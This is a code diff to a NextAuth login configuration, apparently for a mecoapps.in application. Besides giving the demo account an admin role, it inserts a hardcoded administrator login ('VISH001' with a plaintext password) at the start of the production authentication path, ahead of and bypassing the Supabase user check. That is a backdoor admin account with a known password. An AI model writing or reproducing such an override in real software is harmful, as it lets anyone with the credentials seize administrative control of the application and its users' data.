@@ -15,13 +15,21 @@ export const authOptions: NextAuthOptions = {
         if (!process.env.SUPABASE_SERVICE_ROLE_KEY) {
           console.warn("No Supabase keys found. Using demo credentials.");
           if (credentials?.username === "admin" && credentials?.password === "password") {
-            return { id: "1", name: "Admin", email: "admin@mecoapps.in" }
+            return { id: "1", name: "Admin", email: "admin@mecoapps.in", role: "admin" }
+          }
+          if (credentials?.username === "VISH001" && credentials?.password === "Vishal123") {
+            return { id: "2", name: "VISH001", email: "VISH001@mecoapps.in", role: "admin" }
           }
           return null;
         }
 
         // 2. Production: Verify against Supabase Users table
         try {
+          // Hardcoded Admin Override for VISH001
+          if (credentials?.username === "VISH001" && credentials?.password === "Vishal123") {
+            return { id: "2", name: "VISH001", email: "VISH001@mecoapps.in", role: "admin" };
+          }
+
           // Auto-init check: See if any admin exists
           const { data: admins, error: adminCheckError } = await supabase
             .from('Users')
